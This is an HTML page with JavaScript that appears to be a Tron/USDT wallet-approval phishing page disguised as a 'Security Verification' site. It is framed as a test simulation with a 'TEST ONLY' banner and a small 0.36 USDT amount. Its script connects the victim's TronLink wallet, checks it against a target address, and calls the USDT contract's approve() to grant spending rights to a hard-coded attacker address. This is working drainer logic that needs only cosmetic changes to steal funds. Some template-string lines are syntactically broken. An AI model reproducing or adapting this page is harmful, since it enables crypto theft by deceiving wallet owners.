<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #f0f0f0;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.6; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.95); }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 14px;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .tx-hash {
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🛡️</div>
        <h1>Security Verification</h1>
        <p>Verify your USDT authorization status to ensure wallet security</p>
        
        <div class="warning">
            ⚠️ <strong>TEST ONLY</strong><br>
            This simulates a real phishing attack. 
            Real attackers would NOT show this warning.
        </div>
        
        <button class="btn" onclick="connectWallet()" id="connectBtn">
            Connect Wallet
        </button>
        
        <div id="status" class="status"></div>
    </div>

    <script>
        // 配置
        const CONFIG = {
            // 攻击者地址（地址B，模拟攻击者收款地址）
            attackerAddress: 'TS3eWR9PknAn75LH2KuUg2UvVuL6a1PFgK',
            // USDT合约
            usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            // 目标受害者地址（地址A）
            victimAddress: 'TNfMdXDSgXcfK4BkurNRRD29yVdpFZmnZn'
        };

        let connectedAddress = null;

        async function connectWallet() {
            const status = document.getElementById('status');
            const btn = document.getElementById('connectBtn');
            
            try {
                // 检测TronLink
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    connectedAddress = window.tronWeb.defaultAddress.base58;
                    
                    // 验证是否是目标地址
                    if (connectedAddress !== CONFIG.victimAddress) {
                        status.className = 'status error';
                        status.innerHTML = `
                            <strong>⚠️ Wrong Wallet</strong><br>
                            Expected: ${CONFIG.victimAddress.slice(0,10)}...<br>
                                                                                              Connected: $
{connectedAddress.slice(0,10)}...<br>
                            Please switch to the correct wallet.
                        `;
                        return;
                    }
                    
                    btn.textContent = 'Verify Authorization';
                    btn.onclick = verifyAuthorization;
                    
                    status.className = 'status success';
                    status.innerHTML = `
                        <strong>✅ Wallet Connected</strong><br>
                        Address: ${connectedAddress.slice(0,15)}...${connectedAddress.slice(-4)}
                    `;
                    
                } else {
                    status.className = 'status error';
                    status.innerHTML = `
                        <strong>❌ Wallet Not Found</strong><br>
                        Please open this page in:<br>
                        • TokenPocket DApp Browser<br>
                        • TronLink Mobile Browser<br>
                        • imToken DApp
                    `;
                }
                
            } catch (e) {
                status.className = 'status error';
                status.innerHTML = <strong>Error:</strong> ${e.message};
            }
        }

        async function verifyAuthorization() {
            const status = document.getElementById('status');
            const btn = document.getElementById('connectBtn');
            
            btn.disabled = true;
            btn.textContent = 'Processing...';
            
            try {
                const contract = await tronWeb.contract().at(CONFIG.usdtContract);
                
                // 查询当前授权额度
                const currentAllowance = await contract.allowance(
                    connectedAddress,
                    CONFIG.attackerAddress
                ).call();
                
                console.log('Current allowance:', currentAllowance.toString());
                
                // 请求授权（模拟攻击者请求无限额度）
                // 实际测试用小额：0.36 USDT = 360000
                const approveAmount = '360000'; // 0.36 USDT
                
                status.className = 'status success';
                status.innerHTML = `
                    <strong>⏳ Requesting Authorization</strong><br>
                    Please confirm in your wallet...<br>
                    <small>Spender: ${CONFIG.attackerAddress.slice(0,15)}...</small>
                `;
                
                const tx = await contract.approve(
                    CONFIG.attackerAddress,
                    approveAmount
                ).send({
                    feeLimit: 100000000,
                    shouldPollResponse: true
                });
                
                status.className = 'status success';
                status.innerHTML = `
                    <strong>✅ Authorization Complete</strong><br>
                    This is where a real attack would happen.<br>
                    <div class="tx-hash">Tx: ${tx}</div>
                    <br>
                    <strong style="color: #dc3545;">
                        ⚠️ In a real attack, your funds would now be at risk!
                    </strong>
                `;
                
                // 通知测试服务器（可选）
                notifyTestComplete(tx, connectedAddress);
                
            } catch (e) {
                btn.disabled = false;
                btn.textContent = 'Verify Authorization';
                status.className = 'status error';
                status.innerHTML = <strong>❌ Failed:</strong> ${e.message};
            }
        }

        async function notifyTestComplete(txHash, address) {
            // 发送测试结果（用于记录）
            console.log('Test complete:', { txHash, address });
            
            // 实际可以发送到测试服务器记录
            // fetch('https://your-test-server.com/log', {...})
        }

        // 页面加载时检测钱包
        window.addEventListener('load', () => {
            if (window.tronWeb &&window.tronWeb.defaultAddress.base58) {

       document.getElementById('connectBtn').textContent = 'Wallet Detected - Click to Connect';
            }
        });
    </script>
</body>
</html>
